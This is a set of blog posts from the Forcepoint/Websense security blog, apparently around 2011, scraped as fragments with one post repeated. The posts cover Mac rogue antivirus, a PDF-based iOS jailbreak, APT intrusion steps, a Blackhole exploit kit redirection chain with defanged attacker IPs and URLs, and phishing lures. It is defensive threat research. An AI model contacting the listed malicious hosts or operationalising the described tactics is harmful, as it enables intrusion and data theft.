of specifying whether they want the resulting malware to run on Mac OS X. The builder will then create a Mac OS X binary.\n (Figure 1:   Weyland-Yutani BOT admin interface)\n\n  The Weyland-Yutani BOT DIY crimeware kit and it\'s ability to create Mac OS X malware is a first of it\'s kind and could mean we\'ll be seeing more auto-created Mac OS X malware in the future.\n \nMac OS X Malware \nMore and more malware is turning up targeting Mac OS X.  On average, about 5,000 new pieces of Mac OS X malware are received by security companies a day. This is still quite small compared to the 70,000 pieces of malware received targeting the Windows platform. We believe this number will increase by next year, due to the Mac OS X market share growing and the increase in underground interest in Mac OS X malware creation.\n \nMac OS X Rogue Antivirus \nRogue Antivirus is and has been a hugely successful technique by attackers to scare users into thinking they have been infected, when in reality they haven\'t been, and downloading what they think is antivirus software, paying for it, and installing it on their machine. The end result is that a user pays the attacker directly for installing fake software. This typically happens when a user goes to a legitimate site, which has been compromised and a window that looks much like the Windows Explorer window or desktop window pops up indicating that the machine has been infected:\n(Figure 2: Windows Rogue Antivirus pop-up window)\n \nIn reality, the above screen is actually not Windows Explorer, it\'s a web page that\'s been created to look exactly like Windows Explorer, in order to scare you into thinking your operating system is telling you that your machine has been infected. By clicking through and continuing, you\'re then prompted with an option to download and install antivirus software that will remove all the infections. Once you download it and start the installation process, you\'re asked to pay for it. At this point, if you decide to pay for it, the attackers have accomplished their goal, they\'ve tricked you into paying them directly for fake software; the software doesn\'t need to steal, or hide itself, it\'s done its job. \nAttackers running these scams have the ability on a website to check what operating system you\'ve had, and up until only recently tricked Windows users, since the graphics on these pages have been crafted to look like the Windows desktop. But attackers have started to target Mac users, and in the last few months, the same websites that used to only trick Windows users, have been tricking Mac OS X users. They started with poisoning Google Search Images to lead to rogue antivirus and then facebook viral scams. The screen will typically look like this for Mac OS X users:\n(Figure 3: Mac OS X Rogue Antivirus pop-up window)\n \nThe screen above looks much like the Mac OS X Finder, the built-in file explorer, and if a user downloads and starts the install process, they, too, are promoted to pay a standard license fee to clean what they assume is an infected machine. The variants that have emerged are Mac Defender, Mac Protector, and Mac Security: \n(Figure 4: Mac Defender admin interface)\n(Figure 5: Mac Protector admin interface)\n(Figure 6: Mac Security admin interface)\n \nAll of these rogue antivirus variants accomplish the same thing: they trick the user into paying for security issues they never had. After installing, they each do slightly differently things, but the goals are all the same: pay the attackers.', 'https://www.forcepoint.com/security-labs/does-mac-os-x-need-protection\n');

And it\'s very, very simple. In fact, in our testing the jailbreak doesn\'t take more than 20 seconds from start to finish and works flawlessly. It doesn\'t crash your browser, and it even looks and feels like a regular App Store installation. Very slick but also very dangerous. \n\n \nThe reason it\'s dangerous is that it works like a drive-by download (but requires user interaction), similar to the ones we see used attacking Windows PCs every day through vulnerabilities and exploit kits. What happens when you click on \"Free\" -> \"Install\" on the jailbreakme.com website is that your browser downloads a PDF file that triggers a vulnerability in how the built-in PDF reader handles a certain Font type which in turn installs the actual jailbreak. \nThis isn\'t the first time we\'ve seen a jailbreak like this for iOS. In fact, jailbreakme.com was used in August 2010 to do exactly the same thing, again with a PDF file. We didn\'t see any malicious use of this attack despite the source code being made available, but will it be different this time? It wouldn\'t be hard for a malicious attacker to reverse engineer how the jailbreak works and create something similar that doesn\'t require the user to click on \"Free\" -> \"Install\" and silently installs malicious code on your iOS device, either through the browser or via an email attachment. If this were created, an attacker could gain full control of your device and install everything from a keylogger to a full-blown bot. Or what about forwarding all mails to a third-party email address? The regular iOS sandbox won\'t be protecting your device, and since iOS is a variant of Unix, anything is possible. \nWe hope that Apple will release an updated firmware to fix this vulnerability and not wait for iOS5 to fix it. On a side note, I made a bet with @mikkohypponen on how long it will take Apple to release the patch. My guess is less than 10 days, Mikko thinks in 5 days.

So much is written about the topic, yet many people don’t really understand it and are just rehashing an old topic under a new name. \nThe jaded folks in the security community say that all of the talk about APTs is FUD because true APTs are very few and far between. I beg to differ. I’d say that the APT buzz is not Fear, Uncertainty, and Doubt but rather Fear, Certainty, and Damage.\nLet’s start with what makes a “true” APT (all examples are real):\nAdvanced: Attackers use a spectrum of sophisticated intelligence-gathering technologies: \nMonths prior to the actual data-stealing attack on an organization, the attackers:\n\nInfiltrate and take control of another (not the target’s) company server. Often this is done through SQL injection of an old table on a neglected web page, or an insecure web application. This will be used as a dead drop for data later on, and the data trail will end there.\n    A custom piece of malware is sent to an employee’s personal email account (knowing that the employee checks their personal email at work). That malware then begins to travel through the network, mapping it and checking for security measures in place. And yes, surveillance of the individual target started before surveillance of the network. Frequently the target of this email is identified through a search of the social web or LinkedIn or Facebook profiles, simple search queries for executive officers on corporate sites, etc. In a social society, there is an abundance of information available about any target, making it that much easier to social engineer a very compelling email to the subject in their native language, using their own likes and information against them to compel them to open the email. The attackers may have already “friended” and conversed with the subject over social sites to gather information.\nPersistent: The attacker absolutely must succeed in their goals. They will conduct patient, steady, ongoing monitoring to find vulnerabilities, repeating attempts, and changing tactics if detected to try, try again:\n\nIn our example, the malware has now mapped the network and has sent information to the attackers about the security protocols in place, including the AV and the proxy firewall address in place. At this point the attackers know how to get in, and more importantly, where their prize probably resides.\nThreat: They also often use multiple vectors of attack, including specifically crafted malware and previously unknown zero-day vulnerabilities.\n\nIn our example, we’ve already seen one custom piece of malware used to conduct surveillance—now comes the killer code.\n    A new email is sent to a personal email account of a different employee; one with access to the data that the bad guys want. Remember, this isn’t a botnet looking for online banking credentials to clear your account. These guys are thinking bigger. They want the intellectual property that makes your business run, they want your source code, or if it is a nation-state, they may want something bigger, either for political or military gain.\n    The new code is also highly refined. It knows which systems to evade and where to go to get the data. It’s aware of how to get that data out without immediate detection. The code is also polymorphic, updating itself frequently to continue to remain undetected by AV and other security measures. Then, the data is often exfiltrated without the IT or security team noticing. Only after a separate incident will the security teams see something fishy in the logs – this is the first time the connection with suspicious IP addresses (remember step 1?) is often noted.\nI’ve recounted this episode, not to scare you, but to help you understand exactly what we mean when we say “APT”. It is always important to understand the tactics and protocols of your enemy. Sun Tzu warned, \"If you know yourself but not the enemy, for every victory gained you will also suffer a defeat.\"\nLet’s all get on the same page when we talk about APTs. Like we said before, APTs won’t target everyone, but it is important to understand how they work, and how we must change our security tactics because of them. Because while your organization may not be the next target of a state-sponsored attack, those same exploits and tactics are frequently used by other hackers to simply steal money or other important information from your company. There’s actually quite an ongoing vicious cycle of consistent improvement in malware techniques:\nFor example, the \"Capitalist\" hacker who designs his malware for commercial gain creates the attacker toolkit, the \"Nationalist\" hacker who designs his malware grabs that and improves on it or combines it with the attacker toolkits from other sources, then the \"capitalist\" hacker learns from that and incorporates the enhancements into their publically available attacker toolkit, and the cycle repeats itself.  Again the central point is they all have M16 weapons and some are attacking banks and others are using them in national wars. It is just the reason that changes and the person who is impacted that changes, the gun is the same in both cases.\nSurprisingly, the tactics to combat these threats, whether genuine APTs or their data stealing derivatives in the headlines are surprisingly similar. We’ll get into that more in the next post.\nSo, what are some of the first changes you have made within your organization in light of recent attacks? What are you planning to do next?', 'https://www.forcepoint.com/insights/apts-part-3-know-your-enemy\n');

Although in the majority of cases unpatched users are exploited, I want to show how sometimes researching these cases can lead to a dead end. \nThis morning I saw a case that led a user from a Google search result to a Blackhole exploit kit, one of the most widely used exploit kits in the wild.  \nLike most exploit scenarios, attackers always have a lure to attract the user to click on a link and start them on the path of exploitation or installation of malware. This can be done in numerous ways: Phishing emails, Facebook social networking viral scams, Google search engine poisoning, etc. In this case, attackers have poisoned search engine results of the keywords \"shia labeouf\", which is #10 on Google\'s hot trends: \n\n(Figure 1: Google Hot Searches. \"shia labeouf\" is #10)\n \nIf a user was to search for \"shia labeouf\", search result #45 leads to  hxxp://shiantology[dot]com/: \n\n(Figure 2:  hxxp://shiantology[dot]com/ screen shot)\n \nThis site has been compromised, and has an iframe injection that leads to a Blackhole exploit kit:\n\n \nThe iframe injected in the code silently makes a connection to the above IP address:\n\n(Figure 3:  hxxp://shiantology[dot]com/ redirection chain)\n \n65 [dot] 75 [dot] 129 [dot] 9 responds with the following payload (obfuscated HTML code + a JavaScript deobfuscation algorithm): \n\n(Figure 4: Obfuscated text within HTML div tags)\n \n\n(Figure 5: JavaScript deobfuscation algorithm)\n \nThe code above causes the browser to make a connection to /games/A.class.\nhxxp:// 65 . 75 . 128 . 9/Home/index.php makes a connection hxxp:// 65 . 75 . 128 . 9/Home/games/A.class \n\n  Normally, we\'d be able to see this by looking at the final resulting DOM of the browser (after all the JavaScript has run and the document.ready event has been triggered):\n\n(Figure 6: 65 [dot] 75 [dot] 129 [dot] 9 final DOM)\n\n  One thing to notice is that looking at the above DOM code, there is no object or applet tags that are shown and require an A.class. Good thing we were watching the network connections and JavaScript hooked events. This is a reminder that a Web page with the use of dynamic client-scripting like JavaScript can continually change.The finalized DOM does not always represent the DOM at all stages of the document, changing due to JavaScript functions being called. \n\n  What happened is that during the deobfuscation phase, the algorithm above created a series of document nodes. One of them was most certainly an object or applet which required A.class. It then did some other checks, for example browser type, and function existence all for the purpose of verifying which browser was actually running (this is an alternative to checking the user agent string) and then redirecting the browser based on the result to another redirector:\n\n  Status: 302\n  Location : hxxp:// 109 . 236 . 81 . 40/\n  Content-Type : text/html; charset=iso-8859-1\n\n  hxxp:// 109 . 236 . 81 . 40/ is a redirector that redirects the browser to google.com\n\n  Status: 302\n  Location : http://google.com\n  Content-Type : text/html\n\n  In this particular case our research has led us to a dead end. Many times the obfuscated code and checks will only trigger if ALL conditions are correct. If they are, the code redirects the browser to exploit files. If they are NOT then the redirector redirects the browser somewhere else. In this case the browser was redirected to hxxp://google[dot]com, but we could have just as well been redirected to Bing or Yahoo! or another major search engine as means of leading you off track. In many cases your browser will also be redirected to hxxp://searchportal.information[dot]com \nWebsense Labs has a group of researchers specifically focused on exploit kits. Websense customers are protected from the Blackhole exploit kit as well as other exploit kits by ACE, our Advanced Classification Engine.\n \nIf you have any comments on this blog or questions about engine poisoning or exploit kits please ask them below: we always look forward to hearing from our readers and hopefully helping them understand how to protect themselves from the ever-changing threat landscape.\n \nThanks! \nStephan Chenette - Principal Security Researcher\n  Contributions by Elad Sharf - Security Researcher', 'https://www.forcepoint.com/security-labs/blackhat-seo-poisoning-leads-blackhole-exploit-kit\n');

He even created bogus security features to make the application look click-worthy. Of course we didn’t launch the app, but thousands do – every single day.\nThe psychological reasons people fall for scams were brought to life by David Modic, an internet security psychology expert at Exeter University. Unsurprisingly, the bad guys seem to know what makes people tick and how to get them to click. Following a presentation on the legal implications of social media, the debate swung heavily into the arena of policy.\nThe audience rated top concerns for social media : malware infection (21%), legal liability (18%) and productivity loss (17%).

The Top Web Hacking Techniques acts as a centralized knowledge base, a way to recognize researchers who contribute excellent work, and digestible way for the community keep up with the latest trends -- a look forward.\n\nAfter the presentation I got the opportunity to meet many new people and learn more about the things in Web security that most interest them. Lots of chatter about where OWASP as an organization should be heading, conversations about the latest hacks in the news, what various Web security vendors are up to, and of course, several personal appsec projects.

However, they aren’t the only ones who are likely to try to snag these new top level domains. There’s a very legitimate concern that cybercriminals could also seek these new domains to create legitimate looking websites using well-known brand names. These can then be used for phishing attacks or delivery of Trojan malware to unsuspecting visitors. For example – imagine you received an email from “yourbank.bank.” You might tend to trust those emails, but in the beginning at least, you wouldn’t necessarily know if this came from the institution in which you have accounts.\nThe biggest brands will all reach out to ensure they get control of most of the top-level domains using their brand name, but the mid-to-small level businesses may not have the resources to do so. This is where the largest danger will lie. I can see for example, small regional banks with small IT departments being taken advantage of in this way. ICANN will need to strictly enforce its policies and stringent evaluation procedures for generic top level domains so that the bad guys don’t get their hands on them.\nBusinesses need to do two things in preparation for the introduction of these new domains:\nEnsure that your brand is protected by preregistering your company name and trademarks under the new top-level domains and secure the rights to these.\n  Take precautions so that your employees at work and at home aren’t accidently accessing bogus sites by ensuring they are protected by a security solution that can examine the content and links within a site for malicious code in real time. This will prevent the malware from getting into your company network\nWhat do you think about this decision? Good for brand building or better for exploitation?

That’s a huge volume, and a huge concern. Medical records are a veritable gold mine of personal data, often containing a complete package of all the valuable information criminals need to perpetrate fraud, including: SSNs, DOB and in many cases, insurance and credit card information.\nBecause many hospitals and healthcare organizations have received funding through the economic stimulus bill to increase their adoption of EHR, many organizations are making the shift. However, if the adoption of EHR is not conducted with the proper security measures in place, you have a recipe for disaster. Sure, there’s HIPAA and HITECH, but these compliance efforts simply force organizations to look at it from a compliance perspective rather than security.\nFrom a security perspective, many organizations that have put specific safeguards in place, frequently focus on preventing access from outsiders. However, we now know that the legacy safeguards of yesterday do little to prevent today’s more sopisticated malware, and do nothing to prevent insiders from taking the data out. With so much sensitive data in one place, we have to adapt the way we are looking at the threats and shift tactics to focus on not only compliance, but also security.

I know this can seem overwhelming from a budget and resource perspective, but it’s got to be our focus going forward, before cybercriminals begin to further exploit the healthcare sector.\nMaybe the first way we can begin to tackle this is for you to share how you have shifted your organizations mindset from simply compliance to now include proactive security.

We are going to stick to the facts. In this piece, I want to separate from the buzz around these attacks and talk about why you should care.\n\nWe’ve heard from a lot of executives, “What should we do about APTs?” There is a high level of concern from large organizations with serious IP (like source code) that they know others will try to get. But there’s also a large group that thinks, “I’m a $10M manufacturing company, in Ohio. I don’t think Chinese or North Korean hackers are going to be knocking on my door anytime soon.”\n\nAnd, they are right. For many companies, APTs by definition aren’t a primary concern. We’ll talk about definitions of APTs a little more later on, but the base starting point we all need to know is very simply that APTs are a type of targeted attack. This is where we start to get into the why you should care part. Because, while APTs may not be a concern for many companies, targeted attacks are on everyone’s radar. Here’s a simple fact. APT techniques used in state-sponsored attacks seeking IP are also used by organized criminal gangs looking to score your cash. No, not everything is a classic APT, but the same technology used by China to hack Google is used by cybercriminals to steal your customer data.\n\nIt’s a bit like a bullet proof vest. Foreign governments and state-sponsored agents spend huge resources coming up with ammunition that will pierce that vest. Once the ammo becomes known you start to see it adopted and utilized outside of those that developed the ammunition,\n\nThe same thing happens with attack methodologies. Let’s look at a classic APT and how quickly the techniques got into the hands of others.\n\nThe Aurora attacks of 2009 were among the first widely publicized APTs. Companies like Google, Adobe and Rackspace were targeted by a state-sponsored APT in November and December of that year. On January 12, Google publicly announced they were attacked. Only two days later, the zero-day exploit was revealed publicly. Nine days passed until Microsoft patched the primary vulnerability. At that time, the exploit was only detected by 26 percent of AV vendors. And, within a single month, Websense® ThreatSeeker® Network found more than 200 new websites using the exploit to deliver other malware.\n\nThose sites weren’t all put up by the country that attacked Google. That exploit was put up by organized criminal gangs who knew they had a new round of ammunition to go after their primary targets –companies with customer information or credit card numbers they could quickly turn into cash.\n\nSo how’s this for some straight talk, and leaving the marketing at the door. APTs aren’t relevant to everyone. But targeted attacks are.\n\nIn the next post, we’ll look at defining an APT. There’s too much fluff out there describing what they are.

Realizing he hadn’t used a proxy to hide his IP address, potentially making him traceable, he shared the knowledge with fellow hackers so they could hack the accounts instead.\n We\'ll continue to look at other types of hackers in future posts. Stay tuned for more Insights in the coming days.', 'https://www.forcepoint.com/blog/insights/cybercrime-%E2%80%98five%E2%80%99-are-all-hackers-same\n');

Websense became famous as the best URL filtering company. We invented our ThreatSeeker Network and the world’s first Honey Grid, and as a result, we know the Web better than anyone else. Our customers saw Websense filtering as nice-to-have software that helped employees be productive and prohibited inappropriate use of a company’s Internet access.\n\nBut as our knowledge of the Web deepened, we were on the front lines as more attacks and security threats moved online. We quickly became the go-to experts on Web-based threats and our technology was so ingrained within the Web that we often were the first company to detect these threats. As we moved from filtering to Web security, we often protected our customers from Web threats before competitors were even aware that they existed.\n\nWe also realized that destination security was not enough to protect our customers from modern malware that existed not only on bad reputation sites, but on some of the most commonly visited Web 2.0 sites such as Facebook and Youtube. Then, to keep up with new threats and customer needs, we had to be able to categorize content on the fly, even if we have never seen the Web page before. And we had to be able to allow access to a site, but just block the malicious elements.\n\nSo we innovated again and delivered an on-box real-time Web Security Gateway solution integrated in the cloud with our Advanced Categorization Engine and its real-time categorization along with our advanced DLP solution. This gave us real-time inbound and outbound malware detection and protection capabilities as well.  That provides protection from malware on Web sites that evaded detection by traditional AV signatures, allowing our customers to leverage the power of the new Web 2.0 functionality without exposing them to risk.\n\nThe Radicati Group just recognized Websense as the Top Player in the Corporate Web Security - Market Quadrant 2011. Websense was the only vendor recognized as a Top Player with a functionality of 9 or more!\nFrom the report:\n“Websense has been at the forefront of the Web security market for a number of years.  The company dominates the higher end of the market, constantly introducing new concepts and solutions. Its full suite of Web security solutions includes anti-malware protection, URL filtering, application control, DLP, and reporting capabilities.”\n\nGood proof that the transformation from Web filtering to security has been successful. But the story it doesn’t stop there.\nYou see, with our knowledge of the Web, we recognized early on that many attacks had a Web component. But, threats were also converging to include email and data-stealing attacks. So we acquired two companies to shore up our cloud security and data loss prevention technologies. Then we built a unified platform to integrate all of these into something greater than the sum of their parts: Websense TRITON, our unified content security solution.\n\nAnd now, we have been recognized by Frost & Sullivan Award for Market Share Leadership of the Year for content security. The product transformation from filtering to Web security to unified content security (including separately or together: email, Web, and data security) is complete. In today’s threat landscape, endpoint and network security are necessary, but not sufficient. If you don’t believe me, just look at all the data breach headlines and ask yourself if you think those companies don’t have AV and network security in place. So our customers now see us as a must-have defense. Websense has not only the best Web security, but also has the largest share of the content security market, thanks to the uniquely effective TRITON solution.\nWhat have been the biggest changes you have seen in corporate security?

Even though WordPress is an open source project, there are apparently bits which are not that open.\n  We all presume that U.S. federal sites are protected the most. They really should be. However, the latest hack on the Oak Ridge National Laboratory showed us the contrary. Spear-phishing is really a challenge for everyone these days.April was also a month of data breaches including marketing company Epsilon, the European Space Agency, and Sony. These breaches may have affected millions of individuals in their recipient databases. Be wary of and suspect all emailscoming from your usual and otherwise trustworthy senders. Remember also to regularly change your passwords. \n  With all of the breaches running around, the news about the kidnapping of Kaspersky\'s son sounded like something unusually new. It apparently took only two days for Russian police to free him from the kidnappers. It would be great if we could fix all data breaches so quickly.\n \nWeb 2 dot uh oh\n\n  How can you tell whether a Facebook scam is effective or not? By the number of \"likes\" it can gather. All you need is a very provocative title, like \"The Hottest & Funniest Golf Course Video\" scam then sit back and see how many facebook users dare to click the Like button to see the said video. As expected, the end result is a number of survey scams and no trace of the promised video.\n  Scammers are picky, too, sometimes, as demonstrated in \"My Top 10 stalkers\" scam. This scam targets specific countries based on the user\'s IP address. The U.S., Norway, U.K., and the United Arab Emirates are some of the targeted locations.\n  A CAPTCHA image sitting on top of a Facebook comment box is the pawn used by scammers in a recent click-jacking attack. The lure promises yet another provocative video while the real intent is of course for scammers to offer surveys and games.\n  Facebook issued a fix on a glitch discovered by Turkish researcher Serkan Gencel involving users who linked their Facebook profile to a Hotmail email address.\n  In early April, reports surfaced about Google adding a banner to GMail accounts warning if someone from China accessed someone\'s user account. This sort of security blanket, along with Google\'s two-factor authentication, seem to be Google\'s response in the wake of the infamous Aurora attack.\n  Exploit kits appear to be stealing the spotlight from the usual rogue AV payload on poisoned search results. Searching for celebrity child \"Presley Walker\" returned some poisoned image search results with both exploit kit and rogue AV as its payload.\n  Apparently, even Twitter users are curious to see who tried to view their tweets. Twitter-ers who fall victim to this rogue app called \"Profile Spy\" are offered endless surveys, pop-ups and ads.\n  Smartphone apps invading privacy? That\'s the case federal prosecutors are making on Pandora, claiming that the company has been supplying advertisers with consumer information using one of its free smartphone apps running on Google\'s Android OS.\n\n   \n  Browser and friends\n  \n    This month, Apple continues to fix security holes including a few that were successfully exploited by Pwn2Own winners through a series of ios 4.3.2/4.2.7 software update. It provides cover for 5 documented security problems. Apple has also released several security updates including Safari 5.0.5, iTunes 10.2.2.\n    On April 15, Adobe released a security update for Adobe Flash Player to fix a new 0-day vulnerability(CVE-2011-0611), which could cause a crash and potentially allow an attacker to take control of the affected system. This vulnerability is also being actively exploited in both Adobe Reader and Acrobat via a Flash (.swf) file embedded in a Microsoft Word (.doc) or Excel (.xls) file. On April 21, Adobe came up with another important security update for Adobe Reader and Acrobat X to fix several vulnerabilies including the previous one.\n    Right after the Firefox 4 release last month, Mozila delivered the first security update for Firefox 4, including a fix for two chunks of code that had allowed attackers to override a key security protection baked into recent versions of the Windows operating system. A noted security update for Firefox 3.6.17/3.5.19 fixes several vulnerabilities. Three of them – for bugs involving an escalation of privilege through the Java Embedding Plugin, multiple dangling pointers, and miscellaneous memory safety hazards – were rated critical.\n\n \nMicrosoft\n\n  Microsoft released its biggest ever Patch Tuesday of this year in April. It updated 17 bulletins covering 64 vulnerabilities in Windows, Office, Internet Explorer, Visual Studio, SMB, .NET Framework, and GDI+. Among them, 9 bulletins are rated critical and 8 as important.\n  The most important fix is MS-018 that provided a cumulative security update for Internet Explorer. This security update is rated as critical for Internet Explorer 6, 7, and 8 on Windows clients; and Moderate for Internet Explorer 6, 7, 8 on Windows servers. Internet Explorer 9 is not affected by the vulnerabilities. Microsoft encouraged all users to apply this bulletin first.\n  The other top 8 critical bulletins fixed vulnerabilities in the SMB client and server, .NET Framework, GDI+, DNS Resolution, JScript and VBScript Scripting Engines, and CFF Driver.\n  From 60 vulnerabilities Microsoft patched, 30 of them are addressed by a single bulletin MS11-034 which resolved the vulnerabilities in Windows Kernal-Mode Drivers that lead to elevation of privilege. The XSS vulnerabilityCVE-2011-0096has been patched in MS11-021.\n  Beginning in April 2011, the MSVR(Microsoft Vulnerability Research) program began issuing MSVR Advisories that Microsoft had privately disclosed to third-party vendors. It published two bulletins in April. One is covering Use-After-Free Object Lifetime Vulnerability in Google Chrome, the other is about HTML5 Implementation in Chrome and Opera. All the vulnerabilities were already patched by December 2010.\n \nHello ThreatSeeker® Network. You\'ve got mail!\n\n  Another malicious e-card campaign attacked innocent users. What was on the menu this time? Nicely obfuscated content providing spicy iframe to rough AV. Sounds good to you? Sorry, we don\'t serve this juicy content to our users.\n  Do you have a small business and wouldn\'t $1,500 make your month nicer? Well, forget about promises offering easy money for an \"innocent\" money transaction. First, you give up your confidential data to \"who-knows-who\" followed by installing some malicious friend on to your computer.\n  Osama Bin Laden\'s death is big news. Everybody is curious and wants to see the proof. Why not, right? Be wary though. It is better to live without the proof than infect your computer with an unwelcome maliciously crafted guest.\n \nSecurity Trends\n\n  \"Coreflood\" botnet was taken down by the U.S. Justice Department and the FBI. \"Coreflood\" was an infamous botnet that emerged almost a decade ago as a high-powered virtual weapon designed to knock targeted Web sites offline. While investigators counted 413,710 infected machines from March 2009 to January 2010, the total number of machines that were, or had been, part of Coreflood is more than 2.3 million, with more than 1.8 million of them appearing to be located in the U.S.\n  A new marketplace has sprung up to buy and sell IPv4 addresses (or rather, to broker transfers from one organization to another with dollar figures attached). Sites like www.depository.net, www.addrex.net, and www.tradeipv4.com look like they\'ll be with us for a while.\n  Nikon\'s Image Authentication System has an vulnerability that revolves around cryptographic shortcomings in how the secure image signing key is handled by Nikon digital cameras. The Russian encryption specialist, ElcomSoft, has already created a gallery of hoax images that successfully pass validation with Nikon Image Authentication Software. \n  Apple\'s iPhone and iPad constantly track users\' physical location and store the data in unencrypted files on both the iOS device and any computers that store backups of its data.

The example below elaborates on how far people are willing to go to get a response.  \nThe domain used for this targeted scam is dornfordeve.com and has nothing to do with Websense as it is not owned by the company. However, when the company received a letter from a supposed legal firm with a Cease and Desist action on the use of the domain name, it got a few people \"scratching their heads\".  It is unusual to receive letters or emails such as these, and the subject line is sure to grab one\'s attention or invoke a little curiosity. \nBelow is the phishing message example intended for the Legal department. \n\n \nThe content of the message sounds quite stern; however, a little digging on the domain using a simple wget gave us the source code of \"index.html\" (below).\n \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"  \"http://www.w3.org/TR/html4/strict.dtd\">\n  <html>\n  <head>\n  <title>dornfordeve.com</title>\n</head>\n<frameset rows=\"100%,*\" border=\"0\">\n  <frame src=\"https://www.mailcontrol.com/login/login_form.mhtml\" frameborder=\"0\" />\n  <frame frameborder=\"0\" noresize />\n  </frameset>\n <!-- pageok -->\n  <!-- 05 -->\n  <!-- -->\n</html>\n \nInstead of the cybercriminal simply buying a corresponding or closely-related domain name, they have an embedded frame to Websense\'s Hosted Email Security page.  An unsuspecting user entering the URL into the address bar  of a browser is automatically and transparently presented with Websense\'s Hosted Email Security logon page (mailcontrol.com). \n\n \n Further investigation into the domain name using robtex also shows similarly listed domains up for sale. \n\n \nAlthough there is nothing malicious about this, the intent is pretty obvious as this is not a domain owned by us.  Whoever was behind this clearly knew what they wanted, and in some circumstances would probably achieve their aim (although sadly for them, not today). \n \nPiecing things together suggests this hypothesis:\nCybercriminal decides on most eligible targets\n  Cybercriminal buys domain name either directly or via proxy\n  Cybercriminal plants a frame on bought domain that points to the target\'s Website\n  Cybercriminal masquerades as law firm and contact the legal department of targeted company\n \nDesired outcomes for group:\nCompany panics and offers to buy domain at extortionate price\n  Company bites or tugs on the bait to start a dialogue, with the group eventually being offered a settlement\n \nBest bit of advice:\nIf a domain does not belong to you, check first on the legitimacy of senders, report this as an incident (a company\'s Information Security team would have a means of reporting incidents), and monitor further communication (if any).', 'https://www.forcepoint.com/blog/security-labs/high-court-scams-legal-dept\n');

Previously, Canada was a place of great beer and hockey (next year, Habs!). But Websense recently conducted an analysis of Canada’s cyber security risk profile, and all trends pointed to Canada as the new launchpad for cybercriminals. For example:\n\nJump in Hosted Phishing Sites - Canada saw a huge increase in the number of servers hosting phishing sites, jumping 319 percent in the last year. This tremendous increase over the last 12 months is second only to Egypt in terms of the growth of sites hosting crimeware.                            \n	Increase in Bot Networks – Cybercriminals are moving their command and control centers to safer grounds. In the past eight months, Canada saw a 53 percent increase in bot networks. In fact, Canada scored the second highest for hosting bot networks, when compared to the U.S., France, Germany and China.   \n	Malicious Websites – We’re seeing a trend of malicious websites decline across the board. However, Canada’s decline is tremendously slower, when compared to the countries listed above.\n	Overall Increase in Cybercrime – In Websense’s most recent Threat Report, Canada was #13 in the world for hosting cybercrime. Now they have jumped to #6 in the world in 2011. And, this number continues to rise.\n \n\n\n\n\n\n \n\nMore malicious content is being hosted in Canada than ever before. How will the public and private sector protect Canada? And, will the Canadian government be able to take down major Internet crime networks - similar to when the US brought down Rustock and Coreflood? \n\nHere\'s a quick peek at the top countries hosting phishing sites for the first part of this year.

IP addresses in China and Eastern Europe are highly scrutinized and undergoing intense evaluation. So hackers are on a quest to move their networks to countries, like Canada, that have better cyber reputations. \nIt\'s a little surprising to me as well. Previously, Canada was a place of great beer and hockey (next year, Habs!). But Websense recently conducted an analysis of Canada’s cyber security risk profile, and all trends pointed to Canada as the new launchpad for cybercriminals. For example:\nJump in Hosted Phishing Sites - Canada saw a huge increase in the number of servers hosting phishing sites, jumping 319 percent in the last year. This tremendous increase over the last 12 months is second only to Egypt in terms of the growth of sites hosting crimeware.                            \n  Increase in Bot Networks – Cybercriminals are moving their command and control centers to safer grounds. In the past eight months, Canada saw a 53 percent increase in bot networks. In fact, Canada scored the second highest for hosting bot networks, when compared to the U.S., France, Germany and China.   \n  Malicious Websites – We’re seeing a trend of malicious websites decline across the board. However, Canada’s decline is tremendously slower, when compared to the countries listed above.\n  Overall Increase in Cybercrime – In Websense’s most recent Threat Report, Canada was #13 in the world for hosting cybercrime. Now they have jumped to #6 in the world in 2011. And, this number continues to rise.\n\n\n  \n    \n\nMore malicious content is being hosted in Canada than ever before. How will the public and private sector protect Canada? And, will the Canadian government be able to take down major Internet crime networks - similar to when the US brought down Rustock and Coreflood? \nHere\'s a quick peek at the top countries hosting phishing sites for the first part of this year. You can clearly see that Canada now holds the number two position for hosting this type of crimeware. \n\nSo, the question I have for you folks - is this surprising to you? Why or why not?

But as the pressure builds on the US Government to release these photographs, there has been very little written on the impact this would have to the cyber-security space.\nMost of these scams have so far relied on social engineering. Judging by the number of people falling for the previously mentioned scams, they have been successfully lured into believing these pictures are available. These have been successful, despite the fact that pictures have not been released.\nBut what if the US Government were to actually release these photographs - what would happen next? \nAt this point we would see a second wave of these scams over the usual channels as users would now know the pictures were in the public domain and by just clicking on a link they could view them. This is just going to be another opportunity for the bad guys to again resume the campaigns with a new twist. The majority of these links will have bad intent behind them and many people could fall to these same scams again. What makes this even worse is if this happens when employees access these sites at work, where the company may not have adequate protection in place to stop these issues and potential data loss could occur.\nEven if the US government does not release the photos, there are also bound to be “Osama bin Laden photos leaked” scams, again and again for some time. As long as there are people clicking on these links, even years from now, the bad guys will continue to exploit them.\nWebsense recommends that users get news and information from trusted sources on the internet only, unfortunately, a friend posting a link on Facebook is not one of those sources.\nFinally, here is a link to the real pictures....', 'https://www.forcepoint.com/blog/insights/osama-photos-scam-me-once-what-happens-next\n');

We want to warn everyone looking for news on bin Laden’s death to be cautious when clicking new links. Make no mistake—hackers are going after websites, like @ReallyVirtual’s, along with search engine results to prey on visitors looking for more information. Compromises on breaking news items are also very dangerous to organizations because employees who are searching online can potentially put an organization at risk for exploit and data loss.\nThe Black Hole Exploit Kit is a do-it-yourself, drive-by exploit that keeps trying multiple vulnerabilities to compromise an end user’s computer. The kit allows individuals with little or no coding knowledge to deliver many different types of malware, from scareware or Rogue AV to custom Trojans that steal information like online banking credentials. This exploit kit was recently used to exploit websites belonging to the USPS, for example.\nWhat is amazing in this circumstance is that we saw stories from huge newswires and big online publications like CNN/Money  link to this Twitter account which then had the link to the infected website.\nSo the end result is that users trying to follow one of the most highly visible stories in the world on very legitimate sites were within two clicks of a malware-infected site.

